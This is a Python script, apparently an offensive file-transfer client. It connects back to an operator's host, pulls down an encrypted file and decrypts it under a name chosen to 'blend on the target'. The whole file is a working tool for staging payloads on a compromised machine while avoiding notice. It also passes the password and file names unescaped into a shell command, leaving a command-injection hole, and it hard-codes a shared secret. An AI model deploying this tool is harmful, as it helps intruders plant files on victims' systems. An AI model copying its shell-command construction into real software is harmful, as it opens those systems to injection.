import socket  # Import socket module
import argparse
import os
import hashlib

__author__ = "ice-wzl"
__version__ = "0.1.0"
__license__ = "MIT"


def do_hashing(ifile):
    get_hash = hashlib.md5(open(ifile, "rb").read())
    get_final = get_hash.hexdigest()
    print("Recieved file with MD5: {}\n".format(get_final))


def do_decryption(input_file, password, output_file):
    do_dec = os.system(
        "openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:{} -in {} -out {}".format(
            password, input_file, output_file
        )
    )
    return do_dec

def make_request(host, port):
    s = socket.socket()
    s.connect((host, int(port)))
    s.send(
        b"wK1NLC7DUO2N73E1AxGE"
    )  # your own secret key, create your own on both the client and server, they must be the same...

    with open(args.file, "wb") as f:
        print("receiving data...")
        while True:
            data = s.recv(1024)
            if not data:
                break
            f.write(data)
        f.close()
        print("Success")
        s.close() 
        print("Connection closed\n")
        


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-i",
        "--ipaddress",
        help="The ip address to connect back to",
        action="store",
        dest="ipaddress",
    )
    parser.add_argument("-p", "--port", action="store", dest="port")
    parser.add_argument(
        "-f",
        "--file",
        help="The file to pull down, it will be the same as the server.py -f option",
        action="store",
        dest="file",
    )
    parser.add_argument(
        "-b",
        "--blend",
        help="Decrypted out file name, make sure to pick something that blends on the target",
        action="store",
        dest="blend",
    )

    parser.add_argument(
        "-v", "--verbose", action="count", default=0, help="Verbosity (-v, -vv, etc)"
    )

    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s (version {version})".format(version=__version__),
    )

    args = parser.parse_args()

    if not args.ipaddress or not args.port or not args.file or not args.blend:
        print("Required arguments {ipaddress, port, file, blend}, try again...")
    make_request(args.ipaddress, args.port)
    do_hashing(args.file)
    get_password = input("Enter password for decryption: ")
    do_decryption(args.file, get_password, args.blend)
    print("File Decrypted")